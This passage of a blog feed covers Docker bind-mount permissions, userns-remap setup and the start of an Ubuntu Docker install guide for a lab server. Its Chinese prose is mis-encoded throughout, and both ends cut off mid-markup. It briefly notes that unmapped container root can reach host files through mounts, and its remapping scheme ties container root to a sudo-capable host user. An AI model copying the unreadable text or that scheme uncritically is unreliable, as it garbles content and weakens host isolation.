id="æ–‡ä»¶æŒ‚è½½åŸç†">æ–‡ä»¶æŒ‚è½½åŸç†</h3><p>ç®€è€Œè¨€ä¹‹ï¼Œ<strong>dockerçš„æ–‡ä»¶æŒ‚è½½ä¸­ï¼Œå®¹å™¨å†…å¤–uidä¸gidç›¸åŒ</strong>ã€‚</p><p>æœ€ç®€å•çš„æŒ‚è½½ç£ç›˜ï¼Œä¾‹å¦‚ï¼š<code>docker run -v $PWD:/data bash</code>ï¼Œå°±æ˜¯å°†å½“å‰ç›®å½•æŒ‚è½½åˆ°å®¹å™¨å†…çš„<code>/data</code>ç›®å½•ã€‚æ–‡ä»¶çš„æƒé™å¯ä»¥é€šè¿‡<code>ls -l</code>æŸ¥çœ‹ã€‚</p><p>å®¹å™¨å†…å¯èƒ½æœ‰ä½¿ç”¨rootç”¨æˆ·å’Œérootç”¨æˆ·è¿è¡Œç¨‹åºçš„ä¸¤ç§æƒ…å†µã€‚</p><ul><li>è‹¥å®¹å™¨å†…ä½¿ç”¨rootè¿è¡Œç¨‹åºï¼Œå¯ä»¥æƒ³è±¡ï¼Œäº§ç”Ÿçš„æ–‡ä»¶å±äº0:0ï¼Œä¹Ÿå°±æ˜¯root:rootã€‚å®¹å™¨å¤–æ–‡ä»¶ä¹Ÿä¼šå±äº0:0ï¼ŒåŒæ ·æ˜¯root:rootã€‚è¿™æ ·äº§ç”Ÿçš„æ–‡ä»¶å°±éœ€è¦å®¹å™¨å¤–çš„rootæƒé™æ‰å¯ä»¥æ“ä½œã€‚</li><li>è‹¥å®¹å™¨å†…ä½¿ç”¨érootè¿è¡Œç¨‹åºï¼Œä¾‹å¦‚<code>demo:x:1000:1000::/home/blog:/bin/bash</code>ï¼Œäº§ç”Ÿçš„æ–‡ä»¶å±äº1000:1000ã€‚å®¹å™¨å¤–æ–‡ä»¶ä¹Ÿä¼šå±äº1000:1000ï¼Œè€Œå®¹å™¨å¤–uidä¸º1000çš„ç”¨æˆ·å¯èƒ½æ˜¯testï¼Œè¿™æ˜¯è‹¥ç¢°å·§ä½ å°±æ˜¯testï¼Œä½ å°±å¯ä»¥é¡ºåˆ©è¯»å–è¿™ä¸ªæ–‡ä»¶ã€‚ä½†è‹¥ä½ æ˜¯uidä¸º1001çš„test2ï¼Œè€Œä¸”tæ˜¯ä¸ªtest2è®¨åŒé¬¼ï¼Œä½ å°±å‘Šåˆ«è¿™ä¸ªæ–‡ä»¶äº†ã€‚ç”šè‡³å®¹å™¨å¤–æ ¹æœ¬æ²¡æœ‰uidä¸º1000çš„ç”¨æˆ·ï¼Œé‚£è¿™ä¸ªæ–‡ä»¶å°±ä¸å±äºä»»ä½•äººã€‚</li></ul><h3 id="dockerç”¨æˆ·ç»„">dockerç”¨æˆ·ç»„</h3><p>dockerç”¨æˆ·ç»„çš„å‡ºç°,ç›®çš„åœ¨äºå½“æ™®é€šç”¨æˆ·æ—¢æ— <code>sudo</code>æƒé™,æœ‰æƒ³è¿è¡Œ<code>docker</code>å‘½ä»¤æ—¶å‡ºç°.</p><p>ä¸€èˆ¬æ¥è¯´,åœ¨<code>linux</code>ç¯å¢ƒä¸‹å®‰è£…å®Œæˆ<code>docker</code>,ç³»ç»Ÿä¼šè‡ªåŠ¨åˆ›å»º<code>id=999</code>çš„<code>dockerç»„</code> . æ­¤æ—¶åªéœ€è¦å°†æ™®é€šç”¨æˆ·åŠ å…¥åˆ°<code>dockerç»„</code>ä¸­å³å¯.</p><blockquote><p>å…·ä½“ dockerç»„çš„id, è¯·è‡ªè¡ŒæŸ¥çœ‹</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210923103643.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210923103643.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210923103642016"></p></blockquote><p>æ–¹å¼æœ‰ä¸¤ç§(éœ€è¦åœ¨æ‹¥æœ‰sudoæƒé™çš„è´¦å·ä¸‹ä¿®æ”¹):</p><ul><li><p>ä½¿ç”¨<code>usermod</code>å‘½ä»¤</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">usermod</span> -aG docker <span class="token operator">&lt;</span>ç”¨æˆ·å<span class="token operator">></span><span class="token comment"># e.g sudo usermod -aG docker test1</span></code></pre></li><li><p>ç›´æ¥ä¿®æ”¹ <code>/etc/group</code> ä¸­ <code>docker </code>æ‰€åœ¨ç»„</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">vim</span> /etc/group<span class="token comment"># åœ¨dockeræ‰€åœ¨è¡Œ,æŒ‰æ ¼å¼åœ¨åé¢æ·»åŠ ç”¨æˆ·åå³å¯</span></code></pre><p>ä¿®æ”¹å®Œæˆå,é‡å¯sshæˆ–é‡æ–°ç™»å³å¯, ä½¿ç”¨<code>id &lt;ç”¨æˆ·å&gt; </code> æ£€æŸ¥æ˜¯å¦åœ¨dockeræ‰€åœ¨ç»„</p></li></ul></div><h2 id="ä¸‰ç§å¯èƒ½è§£å†³æ–¹æ³•">ä¸‰ç§å¯èƒ½è§£å†³æ–¹æ³•</h2><div class="story post-story"><h3 id="1-é™å®šå¼€å¯ç”¨æˆ·">1. é™å®šå¼€å¯ç”¨æˆ·</h3><p>å³è¿è¡Œ <code>docker run -u &lt;xxx&gt;:&lt;xxx&gt; </code></p><p>ä½†è¿™ä¸ªæ–¹æ³•æ— æ³•è§£å†³ä¸Šè¿°çš„éœ€æ±‚</p><h3 id="2-ä½¿ç”¨å­ç”¨æˆ·">2.ä½¿ç”¨å­ç”¨æˆ·</h3><blockquote><p>è‹¥å®¹å™¨å†…å¤–æ–‡ä»¶çš„uid:gidå¯ä»¥ä¸åŒï¼Œè¿™ä¸ªé—®é¢˜å°±å¯ä»¥å¾ˆå®¹æ˜“è§£å†³ã€‚çš„ç¡®æœ‰è¿™ä¹ˆä¸€ä¸ªæ–¹æ¡ˆï¼Œè®©å®¹å™¨å†…æ‰€æœ‰çš„uid:gidä»¥ä¸€å®šçš„è§„åˆ™æ˜ å°„ï¼Œ<strong>æˆ‘æ¨èä½¿ç”¨è¿™ä¸€æ–¹æ¡ˆ</strong>ã€‚æ–‡ç« çš„æ–¹æ¡ˆæ¼”ç¤ºèŠ‚ä¸­æˆ‘ä¼šæ¼”ç¤ºè¿™ä¸€æ–¹æ¡ˆã€‚</p><p>åœ¨å®˜æ–¹æ–‡æ¡£ä¸­ï¼Œè¿™ä¸ªæ–¹æ¡ˆæœ¬èº«æ˜¯ä¸ºäº†è§£å†³å®‰å…¨é—®é¢˜ï¼Œè§<a href="https://docs.docker.com/engine/security/userns-remap/">è¿™é‡Œ</a>ã€‚å‘ç”Ÿå®¹å™¨æŒ‚è½½ç£ç›˜rootæƒé™ææƒä¹Ÿä¸æ˜¯ä¸€æ¬¡ä¸¤æ¬¡äº†ï¼Œè¿™ç®—æ˜¯ä¸€ä¸ªå®˜æ–¹çš„è§£å†³æ–¹æ¡ˆã€‚</p><p><a href="https://docs.docker.com/engine/security/userns-remap/">https://docs.docker.com/engine/security/userns-remap/</a></p><p><strong>ä½†è¿™ä¸ªæ–¹æ¡ˆä¼šæœ‰ä¸€äº›<a href="https://docs.docker.com/engine/security/userns-remap/#user-namespace-known-limitations">é™åˆ¶</a>ï¼š</strong></p><ul><li><strong>ä¸å¯ä½¿ç”¨<code>--pid=host</code> æˆ– <code>--network=host</code></strong></li><li><strong>ä¸å¯ä½¿ç”¨æ— æ³•è¯†åˆ«æˆ–ä½¿ç”¨ç”¨æˆ·æ˜ å°„çš„æŒ‚è½½ç£ç›˜</strong></li><li><strong>è‹¥ä½¿ç”¨<code>docker run --privileged</code>åˆ™å¿…é¡»åŒæ—¶ä½¿ç”¨<code>--userns=host</code></strong></li></ul><p><strong>éƒ½æ˜¯ä¸å¤§çš„é™åˆ¶ï¼Œä½¿ç”¨çš„æ—¶å€™ç•™ä¸ªå¿ƒçœ¼å³å¯ã€‚</strong></p></blockquote><h4 id="è§£é‡Š"><strong>è§£é‡Š:</strong></h4><p>å› ä¸º<code>docker</code> æƒé™æ˜ å°„çš„åŸç†æ˜¯, å®¹å™¨å†…å¤–uidä¸gidç›¸åŒ,</p><p>é‚£ä¹ˆæˆ‘æ˜¯å¦å¯ä»¥ é€šè¿‡ <code>userns-remap</code>  å‘½ä»¤å®ç°, å°†å®¹å™¨å†…çš„root æ˜ å°„åˆ°å®¹å™¨å¤–å®¿ä¸»æœºä¸Šä¸€ä¸ªå…·æœ‰ç®¡ç†å‘˜(sudo)çš„ç”¨æˆ·(ç§°ä¸º<code>siz</code>)ä¸Šå‘¢,è€Œå…¶ä»–æ™®é€šç”¨æˆ·(<code>test&lt;xxx&gt;</code>)åªéœ€è¦åœ¨è¿™ä¸ª<code>siz</code>æ‰€åœ¨çš„ç»„å³å¯. è€Œè¿™ä¸ªç»„çš„å°ç»„ç®¡ç†å‘˜å³ä¸º<code>siz</code>.</p><p>ä½†æ­¤æ—¶ä¸€ä¸ªæ–°çš„é—®é¢˜å‡ºç°äº†: å½“æ™®é€šç”¨æˆ·åˆ›å»ºæ–‡ä»¶å¤¹æ˜ å°„æ—¶, æ­¤æ–‡ä»¶å¤¹çš„æ‰€å±è€…ä¸º<code>siz</code>,ä½†å°ç»„æƒé™ä»…ä¸º<code>xr</code> å³æ‰€åœ¨ç»„çš„æˆå‘˜æ²¡æœ‰ä¿®æ”¹çš„æƒé™,åªæœ‰è¯»å’Œè¿è¡Œçš„æƒé™, å¹¶ä¸”æ­¤æ—¶æ™®é€šç”¨æˆ·(<code>test&lt;xxx</code>&gt; å¹¶æ²¡æœ‰<code>sudo</code>æƒé™,ä¹Ÿå°±æ— æ³•é€šè¿‡<code>chmod g+w</code> ç­‰å‘½ä»¤æ¥å®ç°ææƒ.   æ­¤æ—¶è¯¥å¦‚ä½•è§£å†³å‘¢?</p><p>ç­”: é€šè¿‡è¿›å…¥å®¹å™¨å†…ææƒå®ç°,</p><p>â€‹å› ä¸ºå®¹å™¨å†…çš„ç”¨æˆ·ä¸º<code>root</code>,å³å¯¹åº”çš„æƒé™ä¸ºå°ç»„ç®¡ç†å‘˜<code>siz</code>, è€Œå°ç»„ç®¡ç†å‘˜æ‹¥æœ‰(<code>sudo</code>) æƒé™, åˆå› ä¸ºæ–‡ä»¶æ˜ å°„æ˜¯å®¹å™¨å†…å¤–ç›¸åŒçš„, åœ¨å®¹å™¨å†…ä¿®æ”¹äº†æ–‡ä»¶æƒé™, é‚£ä¹ˆåœ¨å®¹å™¨å¤–æ™®é€šç”¨æˆ·å°±æœ‰äº†<code>è¯»å†™æ‰§è¡Œ</code>çš„æƒé™.</p><h4 id="æ“ä½œå®ç°">æ“ä½œå®ç°</h4><ol><li><p>ä¿®æ”¹<code>/etc/subuid</code> ä¸ <code>/etc/subgid</code></p><p><strong>æŸ¥çœ‹å°ç»„çš„ç®¡ç†å‘˜id</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">id</span> siz<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>siz<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>siz<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>siz<span class="token punctuation">)</span><span class="token comment"># å¾—åˆ° sizçš„id ä¸º 1000</span></code></pre><p>ä½¿ç”¨å¸¦<code>sudo</code>çš„æƒé™è´¦å·ä¿®æ”¹ <code>/etc/subuid</code> ä¸ <code>/etc/subgid</code> æ–‡ä»¶</p><pre class="language-bash" data-language="bash"><code class="language-bash">æ ¼å¼ä¸º: <span class="token operator">&lt;</span>name<span class="token operator">></span>:start:number</code></pre><p>å¯¹åº”æ–¹å¼:  å¦‚æœç»„ç®¡ç†å‘˜<code>id </code>ä¸º<code>1000</code> , åˆ™å¯¹åº”å®¹å™¨å†…çš„<code>root</code> ä¸º<code>1</code> , å³<code>&lt;name&gt;:1000:1</code></p><p>å¦‚æœç»„ç®¡ç†å‘˜<code>id</code>ä¸º <code>1003</code> ,åˆ™å¯¹åº”å®¹å™¨å†…çš„<code>root</code> ä¸º <code>1+(1003-1000)=4</code> å³ <code>&lt;name&gt;:1003:4</code></p><p><strong>æ ¹æ®ç»„ç®¡ç†å‘˜<code>id</code> å¯¹åº”è®¾ç½®å¥½æ˜ å°„</strong></p><p>ä¾‹å¦‚æœ¬æ–‡ç»„ç®¡ç†å‘˜<code>siz</code> çš„ <code>id </code> ä¸º1000 , åˆ™ä¿®æ”¹ä¸ºå¦‚ä¸‹æ ·å¼, å¹¶ä¿å­˜ä¿®æ”¹</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># sudo vim /etc/subuid</span>siz:1000:1siz:100000:65536test1:165536:65536test2:231072:65536demo:296608:65536<span class="token comment"># sudo vim /etc/subgid</span>siz:1000:1siz:100000:65536test1:165536:65536test2:231072:65536demo:296608:65536</code></pre></li><li><p>ä¿®æ”¹<code>docker</code> å®ˆæŠ¤ç¨‹åº  <code>/etc/docker/daemon.json</code></p><p>æ³¨æ„ä¿®æ”¹  <code>/etc/docker/daemon.json</code> æ–‡ä»¶å, ä¼šå¯¼è‡´ä¹‹å‰çš„ é•œåƒä¸å®¹å™¨ä¸è¢«è¯†åˆ«, æ‰€ä»¥è¯·åšå¥½å¤‡ä»½.</p><p>å®¹å™¨-&gt;æ‰“åŒ…æˆé•œåƒ-&gt; æ¨é€åˆ°hub</p><blockquote><p><strong>Enabling <code>userns-remap</code> effectively masks existing image and container layers, as well as other Docker objects within <code>/var/lib/docker/</code>.</strong> This is because Docker needs to adjust the ownership of these resources and actually stores them in a subdirectory within <code>/var/lib/docker/</code>. It is best to enable this feature on a new Docker installation rather than an existing one.</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶çš„åŒ–, è¯·åˆ›å»º</span><span class="token comment"># sudo vim /etc/docker/daemon.json</span><span class="token punctuation">&#123;</span><span class="token string">"userns-remap"</span><span class="token builtin class-name">:</span><span class="token string">"&lt;ç»„ç®¡ç†å‘˜åç§°>"</span><span class="token punctuation">&#125;</span><span class="token comment"># sudo service docker restart</span><span class="token comment"># æŸ¥çœ‹docker çŠ¶æ€ sudo systemctl status docker.service </span></code></pre><blockquote><p>è¿™é‡Œ `â€œuserns-remapâ€:&quot;&lt;ç»„ç®¡ç†å‘˜åç§°&gt;&quot;çš„æ ¼å¼ å‚è€ƒå®˜æ–¹æ–‡æ¡£</p><p><a href="https://docs.docker.com/engine/security/userns-remap/">https://docs.docker.com/engine/security/userns-remap/</a></p><p>Edit <code>/etc/docker/daemon.json</code>. Assuming the file was previously empty, the following entry enables <code>userns-remap</code> using user and group called <code>testuser</code>. You can address the user and group by ID or name. You only need to specify the group name or ID if it is different from the user name or ID. If you provide both the user and group name or ID, separate them by a colon (<code>:</code>) character. The following formats all work for the value, assuming the UID and GID of <code>testuser</code> are <code>1001</code>:</p><ul><li><code>testuser</code></li><li><code>testuser:testuser</code></li><li><code>1001</code></li><li><code>1001:1001</code></li><li><code>testuser:1001</code></li><li><code>1001:testuser</code></li></ul></blockquote></li><li><p>ä¿®æ”¹æ™®é€šç”¨æˆ·çš„ç»„</p><div class="note danger"><p>å½“åœ¨è¿›è¡Œæµ‹è¯•çš„æ—¶å€™å‘ç°ä¸€ä¸ªæ–°çš„é—®é¢˜:</p></div><span class='p cyan'>å³ç»„å†…æ™®é€šç”¨æˆ·åˆ›å»ºçš„æ–‡ä»¶åœ¨å®¹å™¨ä¸­å› ä¸ºæ²¡æœ‰ç›¸åº”çš„`uid:gid` æ˜ å°„, å¹¶ä¸”å®¹å™¨ä¸­çš„`root`ç”¨æˆ·çš„æƒé™å¾ˆä½æ—¶(ç»„ç®¡ç†å‘˜æ‹¥æœ‰sudoæƒé™,ä½†éœ€è¦è¾“å…¥sudoæ‰å¯ä»¥; è€Œå®¹å™¨ä¸­æ—¶æ²¡æœ‰sudoå‘½ä»¤çš„,æ‰€æœ‰è¯´è¿™é‡Œçš„`root`æƒé™å¾ˆä½)åœ¨è¿™ç§æƒ…å†µä¸‹: å°±ä¼šå‡ºç°æ™®é€šç”¨æˆ·åˆ›å»ºçš„æ–‡ä»¶,åœ¨å®¹å™¨ä¸­è¢«è¯†åˆ«ä¸º: `nobody ,nogroups ç°è±¡</span><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210923191104.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210923191104.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210923191103296"></p><details cyan><summary> æš‚æ—¶çš„è§£å†³æ–¹æ³• </summary>              <div class='content'>              <ol><li><p>æ™®é€šç”¨æˆ·åˆ é™¤ç§æœ‰ç»„,å³è®©æ™®é€šç”¨æˆ·çš„ä¸»ç»„ä¸º(dockerå®¹å™¨æ˜ å°„çš„ç®¡ç†å‘˜æ‰€åœ¨çš„ç»„)</p><p>â€‹ä¾‹å¦‚: æœ¬æ–‡æ¼”ç¤ºå°ç»„ç®¡ç†å‘˜ä¸º<code>siz</code>, ç»„åä¸º(<code>siz</code>) åˆ™è®© æ™®é€šç”¨æˆ·<code>test&lt;xxx&gt;</code> çš„ä¸»ç»„ä¸º<code>siz</code></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># å‘½ä»¤:  sudo usermod -g &lt;å°ç»„ç®¡ç†å‘˜åç§°> &lt;æ™®é€šç”¨æˆ·åç§°></span><span class="token comment"># å°†æ™®é€šç”¨æˆ·çš„ä¸»ç»„ä»ç§æœ‰ç»„æ”¹ä¸ºå°ç»„ç®¡ç†å‘˜æ‰€åœ¨çš„ç»„</span>$ <span class="token function">sudo</span> <span class="token function">usermod</span> -g  test1 siz</code></pre><ol start="2"><li>å¯¹å®¿ä¸»æœº(å®¹å™¨å¤–)ç»„æˆå‘˜ä¸­æ™®é€šç”¨æˆ·åˆ›å»ºçš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹æå‡ç»„æƒé™</li></ol><p><strong>ç›®çš„: ä½¿å®¹å™¨å†…<code>root</code>è·å¾—å¯¹è¿™ä¸ªæ–‡ä»¶å¤¹æ‹¥æœ‰ä¿®æ”¹<code>(w)</code> æƒé™</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">chmod</span> g+wxr <span class="token operator">&lt;</span>xxx<span class="token operator">></span></code></pre><ol start="3"><li>å¯¹å®¹å™¨å†…<code>root</code> åˆ›å»ºçš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹æå‡ç»„æƒé™</li></ol><p><strong>ç›®çš„: ä½¿å®¿ä¸»æœº(å®¹å™¨å¤–) ç»„æˆå‘˜æ™®é€šç”¨æˆ·è·å¾—å¯¹è¿™ä¸ªæ–‡ä»¶å¤¹æ‹¥æœ‰ä¿®æ”¹<code>(w)</code> æƒé™</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">chmod</span> g+wxr <span class="token operator">&lt;</span>xxx<span class="token operator">></span></code></pre></li></ol><p><strong>ç¼ºé™·:</strong></p><p><strong>å½“å†…å¤–åˆ›å»ºæ–°çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ä½¿, å†…å¤–è¦ä¸æ–­çš„ä½¿ç”¨<code>chmod</code> å‘½ä»¤è¿›è¡Œæˆæƒ,</strong></p>              </div>            </details></li></ol><h4 id="æ¼”ç¤º"><strong>æ¼”ç¤º:</strong></h4><p><strong>ç»„æˆå‘˜</strong></p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210923112730.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210923112730.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210923112729409"></p><ul><li><p>ç»„ç®¡ç†å‘˜(<code>siz</code>) è¿›è¡Œæ˜ å°„æµ‹è¯•:</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210923112455.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210923112455.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210923112454090"></p></li><li><p>ç»„æˆå‘˜<code>test1</code> è¿›è¡Œæ˜ å°„æµ‹è¯•</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210923113946.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210923113946.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210923113945262"></p></li></ul><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210923114232.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210923114232.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210923114231331"></p><ol start="3"><li><p>ä½¿ç”¨<code>entrypoint.sh</code> å®šåˆ¶è„šæœ¬</p><p>è¿™ä¸ªè¿‡ç¨‹æ˜¯åœ¨ç¼–å†™<code>Dockerfile</code>æ–‡ä»¶æ—¶ä½¿ç”¨çš„,</p><p>ç›®çš„æ˜¯è®©å®¹å™¨å†…å¤–å¯¹åº”çš„ç”¨æˆ·ç›¸ç­‰æ¥è§£å†³æ–‡ä»¶å¤¹æ˜ å°„ç›®å½•æƒé™çš„é—®é¢˜.</p><p>ä¸»è¦çš„æ€è·¯æ˜¯,ä»ä¸»æœºä¸­è¯»å–å½“å‰ç”¨æˆ·çš„<code>id</code>, ç„¶åå†åˆ›å»ºå®¹å™¨æ—¶ç›¸åº”çš„åœ¨å®¹å™¨å†…éƒ¨æ–°å»ºä¸€ä¸ªå¯¹åº”çš„ç”¨æˆ·,</p><p>è¿™æ ·ä¿è¯äº†å®¹å™¨å†…å¤–çš„<code>uid:gid</code> ç›¸ç­‰.</p><p>ä½†åœ¨è¿™ä¸ªé‡Œä¸ç¬¦åˆæˆ‘ä»¬çš„éœ€æ±‚, æ•…ä¸è®¨è®º.</p></li></ol></div><h2 id="æ€»ç»“">æ€»ç»“</h2><div class="story post-story"><p>ä¸ºäº†è§£å†³<strong>è®©å®¿ä¸»æœºä½¿ç”¨æ™®é€šç”¨æˆ·æ¥ä½¿ç”¨docker,è€Œåœ¨å®¹å™¨ä¸­ç›¸å¯¹ç»™ä¸è¾ƒé«˜çš„<code>root</code> æƒé™ç”¨æˆ·éœ€æ±‚.</strong></p><p>æœ¬æ–‡é‡‡ç”¨äº†ä¿®æ”¹dockerå®ˆæŠ¤ç¨‹åºçš„æ–¹æ³•,å…¶å®˜æ–¹æ–‡ä»¶æœ¬æ„æ˜¯<code>docker</code>ä¸ºäº†è§£å†³å®¹å™¨å†…<code>root</code>å‡æƒçš„é—®é¢˜</p><blockquote><p>æ‰€è°“å‡æƒ, å³ä¸åšä»»ä½•ä¿®æ”¹æƒ…å†µä¸‹, å®¹å™¨å†…<code>root</code> ä¸å®¿ä¸»æœº<code>root</code>ç›¸å¯¹åº”, è™½ç„¶è¿™ä¸ªå®¹å™¨å†…çš„æƒé™æ˜¯æœ‰ä¸€å®šé™åˆ¶çš„<code>root</code> æƒé™, ä½†å¯ä»¥é€šè¿‡æ˜ å°„å®¿ä¸»æœºæ ¹ç›®å½•,å°†æ‰€æœ‰å†…å®¹æ˜ å°„åˆ°å®¹å™¨ä¸­, å®ç°åœ¨å®¹å™¨ä¸­è·å¾—æ‰€æœ‰æ–‡ä»¶çš„æƒé™,æ¥å®ç°æ¶æ„æ”»å‡».</p></blockquote><p>é€šè¿‡æ˜ å°„ç”¨æˆ·, å®¹å™¨ä¸­çš„<code>root</code> æƒé™ä¸å®¿ä¸»æœºè¢«æ˜ å°„çš„ç”¨æˆ·æƒé™ç›¸ç­‰,</p><div class="note info"><p>å¯ä»¥æ€è€ƒè¿™æ ·ä¸€ä¸ªé—®é¢˜: å¦‚æœæˆ‘æ˜ å°„çš„å®¿ä¸»æœºç”¨æˆ·æ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·(æ²¡æœ‰<code>sudo</code>)æƒé™,é‚£ä¹ˆå®¹å™¨é‡Œçš„<code>root</code> æœ‰æ²¡æœ‰<code>sudo</code>æƒé™å‘¢?</p></div><details green><summary> ç­”æ¡ˆ </summary>              <div class='content'>              <p><psw>ç­”æ¡ˆæ˜¯æ²¡æœ‰çš„, å¯ä»¥å°è¯•ä¸€ä¸‹. å®¹å™¨çš„çš„<code>root </code>ä»…ä»…æ˜¯ä¸ªåç§°, å®ƒå¯ä»¥å«åš<code>superhero</code> ä¹Ÿå¯ä»¥å«åš <code>tom</code> , åªæ˜¯ä¸ªåå­—,å¹¶æ— æ‰€è°“,çœŸæ­£ç›¸å…³çš„æ˜¯<code>uid:gid</code></psw></p>              </div>            </details></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®éªŒå®¤æœåŠ¡å™¨ç”¨æˆ·åˆ†çº§ç®¡ç†+Dockerå¤šç¯å¢ƒè¿è¡Œè®¾æƒ³</title>
      <link href="/posts/55127002/"/>
      <url>/posts/55127002/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="ç”¨æˆ·åˆ†çº§ç®¡ç†">ç”¨æˆ·åˆ†çº§ç®¡ç†</h2><div class="story post-story"><h3 id="åˆæ­¥è®¾æƒ³">åˆæ­¥è®¾æƒ³:</h3><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210910114927.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210910114927.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210910114926555"></p><p>root ç”¨æˆ·ä¸ºè¶…çº§ç®¡ç†å‘˜,</p><p>ç®¡ç†å‘˜-A æ‹¥æœ‰ç®¡ç†æƒé™,è´Ÿè´£ç»´æŠ¤.</p><p>æ™®é€šç¾¤ç»„æ— è¶…çº§ç®¡ç†å‘˜æƒé™, ä½†æ‹¥æœ‰å¯¹dockeré•œåƒå®¹å™¨çš„åˆ›å»ºä¿®æ”¹åˆ å‡å¯åŠ¨ç­‰æƒé™.</p><p>æ™®é€šç”¨æˆ·ä»dockerhubä¸­æ‹‰å–é•œåƒ,åˆ›å»ºå®¹å™¨ç¯å¢ƒ</p><div class='dropmenu-wrapper'>              <div class='dropmenu'>                <a>è·³è½¬</a>                <ul class='list-v'>                  <li>                <a class='menuitem' href='/page/clubmanualv1/' title='dockerä½¿ç”¨æ‰‹å†Œv1'>                  <i class='fas fa-book-open fa-fw'></i>                  dockerä½¿ç”¨æ‰‹å†Œv1                </a>              </li><hr>                </ul>              </div>            </div></div><h2 id="æ­¥éª¤">æ­¥éª¤</h2><div class="story post-story"><h3 id="å®‰è£…Docker">å®‰è£…Docker</h3><p>æŸ¥çœ‹ç‰ˆæœ¬</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> /proc/version$ <span class="token function">uname</span> -a$ lsb_release -a$ <span class="token function">cat</span> /etc/issue</code></pre><p>å¯¹ç—‡ä¸‹è¯</p><h4 id="ubuntu">ubuntu</h4><p>å‚è€ƒæ–‡æ¡£ <a href="https://docs.docker.com/engine/install/ubuntu/">https://docs.docker.com/engine/install/ubuntu/</a></p><h5 id="ä½¿ç”¨è¿œç¨‹ä»“åº“å®‰è£…">ä½¿ç”¨è¿œç¨‹ä»“åº“å®‰è£…</h5><p><strong>Install using the repository</strong></p><p>Before you install Docker Engine for the first time on a new host machine, you need to set up the Docker repository. Afterward, you can install and update Docker from the repository.</p><ol><li><p>Update the <code>apt</code> package index and install packages to allow <code>apt</code> to use a repository over HTTPS</p> <pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token comment"># å¿…è¦è½¯ä»¶</span>$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> apt-transport-https ca-certificates <span class="token function">curl</span> gnupg lsb-release</code></pre></li><li><p>Add Dockerâ€™s official GPG key:</p> <pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">curl</span> -fsSL https://download.docker.com/linux/ubuntu/gpg <span class="token operator">|</span> <span class="token function">sudo</span> gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</code></pre></li><li><p>Use the following command to set up the <strong>stable</strong> repository. To add the <strong>nightly</strong> or <strong>test</strong> repository, add the word <code>nightly</code> or <code>test</code> (or both) after the word <code>stable</code> in the commands below. <a href="https://docs.docker.com/engine/install/">Learn about <strong>nightly</strong> and <strong>test</strong> channels</a>.</p><blockquote><p>â€‹<strong>Note</strong>: The <code>lsb_release -cs</code> sub-command below returns the name of your Ubuntu distribution, such as <code>xenial</code>. Sometimes, in a distribution like Linux Mint, you might need to change <code>$(lsb_release -cs)</code> to your parent Ubuntu distribution. For example, if you are using <code>Linux Mint Tessa</code>, you could use <code>bionic</code>. Docker does not offer any guarantees on untested and unsupported Ubuntu distributions.</p></blockquote> <div class="tabs" 